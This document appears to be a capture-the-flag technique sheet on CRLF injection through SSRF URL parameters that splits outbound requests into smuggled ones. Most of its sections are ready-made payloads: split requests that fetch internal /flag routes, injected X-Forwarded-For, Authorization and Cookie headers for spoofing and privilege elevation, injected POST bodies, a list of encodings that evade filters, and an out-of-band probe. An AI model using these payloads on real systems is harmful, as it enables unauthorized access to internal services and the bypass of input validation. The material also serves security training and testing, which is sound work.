# CRLF-injection — the SSRF→request-smuggling boundary

When `%0d%0a` survives into the outbound request, the URL isn't a
destination anymore — it's a composer. The fetcher sends YOUR
CRLF; the request splits; a second request rides along.

This is the boundary between web-ssrf and web-request-smuggling —
the weather-app chain is the canonical example.

---

## 1. The mechanism — the request-line split

```text
url=http://internal/x%0d%0aInjected:%20v%0d%0a%0d%0aGET%20/flag%20HTTP/1.1%0d%0aHost:%20internal%0d%0a%0d%0a
                    ↓ %-decode produces raw CRLF
the fetcher sends:
  GET /x\r\nInjected: v\r\n\r\nGET /flag HTTP/1.1\r\nHost: internal\r\n\r\n HTTP/1.1
  Host: internal
  ...

  → the request is now TWO requests — the injected-lines split it —
    the second GET /flag is a request YOU composed
```

The precondition: the URL-parser %-decodes but doesn't strip the
control-chars → raw CRLF reaches the wire → the request splits.

## 2. The injection-sites — where CRLF lands

```text
in the PATH:   url=http://internal/x%0d%0aHeader:%20v
               → the path-segment splits → header-injection
in the HOST:   url=http://x%0d%0aHost:%20internal/
               → the authority splits — host-header rewrite —
               rare — parsers reject host-crlf earlier
in the QUERY:  url=http://internal/x?a=%0d%0aHeader:%20v
               → the query-string carries it — same split
in the FRAGMENT: url=http://internal/x%0d%0a#...
               → fragment usually stripped before send — no
in the SCHEME: url=http%0d%0aX://...     — scheme usually
               validated — no
in the USERINFO: url=http://u%0d%0aX@internal/
               → userinfo may reach the wire → splits
```

The PATH is the reliable carrier — the path-segment travels the
wire verbatim in most fetchers.

## 3. The two-request split — request-smuggling

```text
url=http://internal/x%0d%0a%0d%0aGET%20/flag%20HTTP/1.1%0d%0a
     Host:%20internal%0d%0aX:%20
     ↓
GET /x\r\n\r\nGET /flag HTTP/1.1\r\nHost: internal\r\nX:  HTTP/1.1\r\nHost: real\r\n\r\n
   ↑ first request ends — second request is GET /flag — its Host
     is internal — the trailing "X: " swallows the real request-
     line — the backend sees two requests → the second one's
     RESPONSE may surface — or a queue-position desync happens
```

The weather-app chain worked because the response-queue got
desync'd — the second request's response got attributed elsewhere
— classic request-smuggling.

## 4. The header-injection — single-line addition

```text
url=http://internal/x%0d%0aX-Forwarded-For:%20127.0.0.1
   → the outbound request gains an XFF: 127.0.0.1 header →
     loopback-checks that read XFF pass → the app's loopback-route
     served to a "127.0.0.1" — spoofed-source

url=http://internal/x%0d%0aAuthorization:%20Bearer%20x
   → inject an auth-header — internal-admin-route

url=http://internal/x%0d%0aCookie:%20admin=1
   → inject a cookie — session-elevation on the internal-app

url=http://internal/x%0d%0aHost:%20internal2
   → rewrite the Host header → vhost-routing — hit a different
     vhost on the same server
```

## 5. The body-injection — POST-body composition

```text
url=http://internal/x%0d%0aContent-Length:%204%0d%0a%0d%0aYYYY
   → inject a complete request with body → POST-injection
url=http://internal/x%0d%0a%0d%0aPOST%20/api%20HTTP/1.1%0d%0a
     Content-Length:%2015%0d%0aContent-Type:%20json%0d%0a%0d%0a
     {"a":1}
   → a second request with a full JSON body → internal-API call
     with a crafted body — the api-call the web-side can't reach
```

## 6. The detection — does the url carry CRLF?

```bash
# send a marker-header through the url — read the outbound-request
# via your own listener — the header you injected shows up
python3 tools/web/oob_listener.py serve --port 9000
# then:
url=http://YOUR:9000/x%0d%0aX-Probe:%20present
# the listener logs the request — if X-Probe: present appears as
# a HEADER (not in the path) → crlf-injection confirmed
```

The listener catches the injected-header as a REAL header — the
definitive proof the CRLF reached the wire — not a body-echo but
a wire-shape observation.

## 7. The encoder-family — how %0d%0a reaches the wire

```text
%0d%0a              — standard — decoded → CRLF
%0d%0a%20           — crlf+space — obs-fold — continuation-line
%25%30%64%25%30%61   — double-encoded — decodes to %0d%0a — the
                      SECOND decode produces CRLF — double-decode
                      apps
%0D%0A              — uppercase-hex — some filters check lowercase
%0a                 — lone-LF — some parsers accept LF-only splits
%0d                 — lone-CR
%0a%20              — LF+space — the folded-header trick
%0d%0a%09           — CRLF+tab — the folded-whitespace trick
%560a               — wide-char? — some encoders —
\r\n                — literal-CRLF — if the param isn't encoded
%E5%98%8A          — utf-8 multi-byte that CONTAINS 0a? no —
                    %8a is a different byte — not CRLF
```

`sanitizer_fuzz --forbidden crlf --callable` — differential-sweep
which CRLF-encodings survive the validation layer.

## 8. The multi-request — full pipeline

```text
url=http://internal/x%0d%0a%0d%0aGET%20/flag1%20HTTP/1.1%0d%0aHost:%20internal%0d%0a%0d%0aGET%20/flag2%20HTTP/1.1%0d%0aHost:%20internal%0d%0a%0d%0a
   → THREE requests — the original + flag1 + flag2 — HTTP/1.1
     pipelining — the backend serially serves — the responses
     queue — the middle response is flag1's — desync
```

## 9. The proxy-position — front-end vs back-end

```text
The CRLF-split matters most when a PROXY fronts the app:
  proxy accepts "one request" — sends it to the backend —
  the backend reads TWO → the proxy's request-count desyncs from
  the backend's → the classic H2.CL/CL.TE shapes —
  CRLF-in-URL is one VECTOR for desync — web-request-smuggling
  is the class-skill
```

## 10. The chain to flag — weather-app shape

```text
1. the url-field takes CRLF → request-split confirmed
2. the split-request reaches an internal-route — /admin/flag —
   its response desyncs into the NEXT request's slot → the flag
   lands in SOME response — which one? — the response-queue is
   off-by-one — the flag comes back attached to a different
   request — read ALL the responses
3. or the injected-request carries a header the admin-route
   checks → the route serves to the injected-request → its
   body surfaces
```

## 11. The encoder-order — where the CRLF enters

```text
url=http://internal%0d%0aX:%20v/    — crlf-in-authority —
                                      most parsers reject
url=http://internal/%0d%0aX:%20v    — crlf-in-path-first —
                                      reliable
url=http://internal/x%0d%0aX:%20v   — crlf-in-path-mid
url=http://internal/?x%0d%0aX:%20v  — crlf-in-query-key
url=http://internal/?x=%0d%0aX:%20v — crlf-in-query-value
```

## 12. The "not CRLF" variants — other control-bytes

```text
%00 — NUL — truncates at C-string-boundaries — the url-parser
      may cut → the tail is a different-request-position
%0b — vertical-tab — some split-on-ws parsers
%0c — form-feed — same
%09 — tab — allowed-in-header-values — whitespace-injection —
      header-VALUE padding not header-injection
%85 — unicode-nextline — python3 splitlines() treats \x85 as a
      line-end! — the \x85-split — py-specific
%2028 — unicode-line-sep — js-splits
```

## 13. The boundary-rule — ssrf vs smuggling

```text
- a fetch to your-url that lands on an internal host → SSRF
- a CRLF that splits the outbound request → the WHOLE REQUEST is
  yours → request-injection → desync/boundary-crossing →
  web-request-smuggling — the stronger primitive — the class
  changes
- the weather-app card carries both — the url-field was the door,
  the CRLF was the exploit — classify by the MECHANISM (smuggling)
  not the surface (ssrf)
```
